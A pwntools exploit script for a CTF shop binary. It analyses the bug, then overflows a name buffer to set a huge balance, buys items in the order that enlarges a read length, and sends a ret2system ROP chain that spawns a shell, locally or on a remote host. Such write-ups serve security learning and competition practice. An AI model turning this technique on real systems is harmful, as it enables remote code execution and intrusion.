#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Exploit for "shop" (山石-蒙山杯商城)  --  ret2system, No-PIE / Partial-RELRO / NX / no canary
#
#   $ pip install pwntools
#   $ python3 pwn_shop.py            # local: ./shop
#   $ python3 pwn_shop.py HOST PORT  # remote
#
# ---------------------------------------------------------------------------
# VULNERABILITY ANALYSIS
# ---------------------------------------------------------------------------
# main() @0x400d53:
#   read(0, name=rbp-0x40, 0x3d=61)         # reads 61 bytes into a 64-byte region
#     -> the 'balance' int var_8 lives at rbp-8  => offset 56 inside `name`
#     -> the 'magic name' var_c lives at rbp-0xc => offset 52 inside `name`
#   strncpy(rbp-0x51, name+52, 3); strcmp(rbp-0x51, "pwn")   # anti-cheat:
#     name[52:55] MUST be "pwn" or it prints "检测到栈溢出攻击行为" and exit()s.
#   So: name[52:55]="pwn"  AND  name[56:60]=balance  (we set balance huge).
#
# submenu() @0x400ab9 (menu option 'a'):
#   len = 10 (rbp-0x14)
#   loop:
#     buy 'a' costs  99  -> var4c[0]++
#     buy 'b' costs 199  -> var4c[4]++
#     buy 'c' costs 999  -> var4c[8]++  AND writes "/bin/sh\0" to 0x6018a0  (magic)
#     check21(&var4c,&len): if var4c[0]==2 && var4c[4]==1 -> len = 0x46 = 70   <== !!!
#     puts("你想要继续买花吗? 1/0")
#     read(0, buf=rbp-0x10, len)          # len becomes 70 -> STACK OVERFLOW
#         return address is at rbp+8  => offset 24 from buf
#     if atoi(buf)==1: loop else: leave;ret   # atoi("AAAA..")=0 -> ret -> ROP
#
# EXPLOIT PLAN
#   1. name: pass anti-cheat ("pwn") and set balance = 0x7fffffff.
#   2. in the shop buy: c (plant /bin/sh), a, a, b.
#   3. after 'b', var4c[0]==2 && var4c[4]==1 -> len=70 -> overflow read.
#   4. ROP: pop rdi; ret -> 0x6018a0 ("/bin/sh") -> system@plt.
# ---------------------------------------------------------------------------

from pwn import *

context.clear(arch="amd64", os="linux")
context.log_level = "info"

BIN = "./shop"
elf = ELF(BIN, checksec=False)

# ---- fixed addresses (No PIE) ----
POP_RDI    = 0x400f23   # pop rdi ; ret   (in __libc_csu_init)
RET        = 0x4006f6   # ret             (stack alignment)
SYSTEM_PLT = 0x400730   # system@plt
BINSH      = 0x6018a0   # global buffer where the magic 'c' option writes "/bin/sh\0"

def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BIN)

def main():
    io = start()

    # ---- 1) name: anti-cheat "pwn" @off52, balance @off56, total 61 bytes ----
    name  = b"A" * 52           # off 0..51  (filler)
    name += b"pwn"              # off 52..54 -> var_c, must equal "pwn"
    name += b"A"                # off 55     (var_c high byte, filler)
    name += p32(0x7fffffff)     # off 56..59 -> var_8 = balance (huge)
    name += b"A"                # off 60     (filler)
    assert len(name) == 61, len(name)

    io.recvuntil("请输入你的姓名".encode())
    io.send(name)               # raw read(61) -> send exactly 61 bytes, NO newline

    # ---- 2) enter shop (main menu option 'a') ----
    io.recvuntil("请输入你的选项".encode())
    io.sendline(b"a")

    # helper: buy one item, then answer "continue? 1/0" with "1" to loop again
    def buy(item, cont=True):
        io.recvuntil("请输入购买的商品序号".encode())
        io.sendline(item)
        io.recvuntil(b"1/0")
        if cont:
            io.sendline(b"1")   # read(0,buf,10): "1\n" -> atoi==1 -> loop

    # ---- 3) buy c (plant /bin/sh), a, a  (var4c[0]=2) ----
    buy(b"c")                   # magic -> "/bin/sh" written to 0x6018a0
    buy(b"a")                   # var4c[0] = 1，在 shop 的子菜单 submenu() 里，每次"购买"都会让一个计数器数组对应位置自增
    buy(b"a")                   # var4c[0] = 2 ，"买 2 次 a"就是把 var4c[0] 累加到 2

    # ---- 4) buy b  -> var4c[4]=1 -> check21 sets len=70 -> next read overflows ----
    io.recvuntil("请输入购买的商品序号".encode())
    io.sendline(b"b")           #买 b：让 var4c[4] == 1
    io.recvuntil(b"1/0")        # 此时 check 判定成立 → 输入len 被改成 70，紧接着那次 read(0, buf=rbp-0x10, 70) 就能覆盖到返回地址（距 buf 偏移 24），栈溢出触发

    # ---- ROP: system("/bin/sh") ----
    payload  = b"A" * 24        # buf(rbp-0x10) .. saved rbp .. up to return addr
    payload += p64(RET)         # 16-byte stack alignment for glibc movaps
    payload += p64(POP_RDI)
    payload += p64(BINSH)       # rdi = "/bin/sh"
    payload += p64(SYSTEM_PLT)  # system("/bin/sh")
    payload  = payload.ljust(70, b"A")   # fill the 70-byte 用 A 把 payload 补到 70 字节，既满足 read(0,buf,70) 要读满 70 字节才不会卡住，又用无害填充占满缓冲、不破坏 ROP 链。
    assert len(payload) == 70

    io.send(payload)            # atoi(payload)=0 -> leave;ret -> ROP fires

    io.interactive()

if __name__ == "__main__":
    main()
